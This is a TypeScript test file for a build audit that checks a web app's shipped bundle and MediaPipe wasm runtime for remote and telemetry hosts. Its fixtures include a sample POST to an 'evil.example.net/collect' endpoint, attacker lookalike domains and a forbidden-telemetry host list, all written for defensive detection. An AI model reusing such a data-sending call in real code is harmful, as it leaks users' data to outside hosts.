import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { auditDir, auditText, remoteLinks } from './audit-hosts.ts'
import { AI_ASSET_PINS } from './vite-ai-assets.ts'

const ROOT = fileURLToPath(new URL('..', import.meta.url))
const METRICS_1X =
  'this.m.send({url:"https://odml.pa.googleapis.com/v1/log",bb:"POST",la:1e4,body:r})'

describe('remoteLinks', () => {
  it('lists host and path of every absolute http(s) and ws(s) URL', () => {
    expect(
      remoteLinks(
        'a="https://Cdn.Example.org/x.js?y=1" b=\'http://t.co:8080/p\' c=`wss://live.io/s` //d',
      ),
    ).toEqual(['cdn.example.org/x.js?y=1', 't.co:8080/p', 'live.io/s'])
  })
  it('skips URLs built from expressions, which have no literal host', () => {
    expect(remoteLinks('`https://${host}/x` "http://[${ip}]"')).toEqual([])
  })
})

describe('auditText', () => {
  it('finds a remote host in a JS file', () => {
    expect(auditText('fetch("https://evil.example.net/collect",{method:"POST"})')).toEqual([
      'evil.example.net/collect',
    ])
  })

  it("finds a remote host in a wasm file's strings", () => {
    const wasm = Buffer.concat([
      Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x0b]),
      Buffer.from('\0https://telemetry.vendor.io/v2/ping\0', 'latin1'),
    ])
    expect(auditText(wasm.toString('latin1'))).toEqual(['telemetry.vendor.io/v2/ping'])
  })

  it('ignores the allow-listed comment links', () => {
    const runtime = [
      '// See https://github.com/emscripten-core/emscripten/pull/8236',
      '// see https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/getTimezoneOffset',
      '//   Object._main@http://server.com:4324:12',
      'See: http://go/lsc_proto3_utf8\0See http://goto/weakfields',
      'var ns="http://www.w3.org/2000/svg"; e="https://react.dev/errors/"+n',
    ].join('\n')
    expect(auditText(runtime)).toEqual([])
  })

  it('allows a link only under its listed path, not anywhere on the same host', () => {
    expect(auditText('fetch("https://github.com/someone/else/raw/x.js")')).toEqual([
      'github.com/someone/else/raw/x.js',
    ])
    expect(auditText('"https://react.dev.attacker.io/errors/"')).toEqual([
      'react.dev.attacker.io/errors/',
    ])
    expect(auditText('"https://schema.org.attacker.io/"')).toEqual(['schema.org.attacker.io/'])
  })

  it('allows an entry without a trailing slash only as itself or with a fragment', () => {
    expect(
      auditText(
        [
          '"https://schema.org"',
          'https://github.com/nodejs/help/issues/2136#issuecomment-523649904',
          'see https://github.com/emscripten-core/emscripten/issues/13295.',
        ].join('\n'),
      ),
    ).toEqual([])
    expect(
      auditText(
        [
          '"https://schema.org/x.js"',
          '"https://tailwindcss.com/collect"',
          '"https://example.com/collect"',
          '"https://server.com:4324/x"',
          '"https://github.com/omarcocarvalho/artistica/releases/download/v1/x.wasm"',
          '"https://www.tensorflow.org/lite/guide/ops_select/x"',
        ].join(' '),
      ),
    ).toEqual([
      'schema.org/x.js',
      'tailwindcss.com/collect',
      'example.com/collect',
      'server.com:4324/x',
      'github.com/omarcocarvalho/artistica/releases/download/v1/x.wasm',
      'www.tensorflow.org/lite/guide/ops_select/x',
    ])
  })

  it('fails on odml.pa.googleapis.com', () => {
    expect(auditText(METRICS_1X)).toEqual(['odml.pa.googleapis.com/v1/log'])
  })

  it('fails on a host under a forbidden domain even without a scheme', () => {
    expect(auditText('o="odml.pa."+"googleapis.com";p="/v1/log"')).toEqual(['googleapis.com'])
    expect(auditText('h="odml.pa.googleapis.com"')).toEqual(['odml.pa.googleapis.com'])
    expect(auditText('h="www.Google-Analytics.com"')).toEqual(['www.google-analytics.com'])
  })

  it('allows protobuf type URLs, which name a type and are never requested', () => {
    expect(auditText('"type.googleapis.com/mediapipe.tasks.vision.Options"')).toEqual([])
    expect(auditText('"api.type.googleapis.com/x"')).toEqual(['api.type.googleapis.com'])
  })
})

describe('the shipped MediaPipe runtime', () => {
  it('passes the audit: the bundle C4 imports and both runtime files', () => {
    const files = [
      'node_modules/@mediapipe/tasks-vision/vision_bundle.mjs',
      AI_ASSET_PINS.runtimeLoader.file,
      AI_ASSET_PINS.runtimeWasm.file,
    ]
    for (const file of files) {
      const text = readFileSync(join(ROOT, file)).toString('latin1')
      expect(text.length, file).toBeGreaterThan(100_000)
      expect(auditText(text), file).toEqual([])
    }
  })
})

describe('auditDir', () => {
  let dir: string
  const put = (rel: string, text: string) => {
    mkdirSync(dirname(join(dir, rel)), { recursive: true })
    writeFileSync(join(dir, rel), text)
  }
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'audit-hosts-'))
  })
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true })
  })

  it('scans every shipped file except notices and licences, and reports each violation with its file', () => {
    put('index.html', '<a href="https://github.com/omarcocarvalho/artistica">x</a>')
    put('assets/app-1.js', 'console.log(1)')
    put('assets/w-2.js', METRICS_1X)
    put('assets/s-3.css', '@import url("https://fonts.example.com/a.css");')
    put('assets/r-4.wasm', '\0http://beacon.example.net/b\0')
    put('models/NOTICE.md', 'https://storage.googleapis.com/mediapipe-models/x.task')
    put('models/LICENSE-APACHE-2.0.txt', 'http://www.apache.org/licenses/')
    const result = auditDir(dir)
    expect(result.scanned).toBe(5)
    expect(result.violations).toEqual([
      { file: 'assets/r-4.wasm', link: 'beacon.example.net/b' },
      { file: 'assets/s-3.css', link: 'fonts.example.com/a.css' },
      { file: 'assets/w-2.js', link: 'odml.pa.googleapis.com/v1/log' },
    ])
  })

  it('a clean directory has no violations', () => {
    put('assets/app-1.js', 'fetch("/artistica/models/face_landmarker-float16-1.task")')
    expect(auditDir(dir)).toEqual({ scanned: 1, violations: [] })
  })
})
